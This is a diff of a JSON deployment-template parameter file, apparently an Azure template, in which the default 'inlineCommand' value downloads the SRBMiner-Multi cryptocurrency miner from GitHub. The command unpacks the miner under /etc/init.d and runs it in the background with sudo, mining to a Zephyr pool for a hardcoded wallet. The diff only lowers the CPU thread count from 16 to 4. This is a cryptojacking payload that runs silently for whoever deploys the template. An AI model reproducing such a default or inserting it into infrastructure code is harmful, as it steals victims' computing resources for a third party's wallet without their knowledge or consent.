@@ -67,7 +67,7 @@
         },
         "inlineCommand": {
             "type": "string",
-            "defaultValue": "sudo apt-get update -y; sudo apt install screen -y; sudo sysctl -w vm.nr_hugepages=1280; cd /etc/init.d/; wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.7/SRBMiner-Multi-2-4-7-Linux.tar.xz; tar xf SRBMiner-Multi-2-4-7-Linux.tar.xz; cd SRBMiner-Multi-2-4-7; sudo nohup ./SRBMiner-MULTI --algorithm randomx --pool de.zephyr.herominers.com:1123 --tls true --wallet ZEPHYR3NDqmD7mN2DAZdZx3DH8CvRs92mE7KnnpKDkXDZcXytMQmKMc8azkr39BRTdhFHd4CF2zcST8kHQQPMcojUezfegbKsag2N --password luckyvl --keepalive true --cpu-threads 16 --disable-gpu>log.out &",
+            "defaultValue": "sudo apt-get update -y; sudo apt install screen -y; sudo sysctl -w vm.nr_hugepages=1280; cd /etc/init.d/; wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.7/SRBMiner-Multi-2-4-7-Linux.tar.xz; tar xf SRBMiner-Multi-2-4-7-Linux.tar.xz; cd SRBMiner-Multi-2-4-7; sudo nohup ./SRBMiner-MULTI --algorithm randomx --pool de.zephyr.herominers.com:1123 --tls true --wallet ZEPHYR3NDqmD7mN2DAZdZx3DH8CvRs92mE7KnnpKDkXDZcXytMQmKMc8azkr39BRTdhFHd4CF2zcST8kHQQPMcojUezfegbKsag2N --password luckyvl --keepalive true --cpu-threads 4 --disable-gpu>log.out &",
             "metadata": {
                 "description": "inline command"
             }
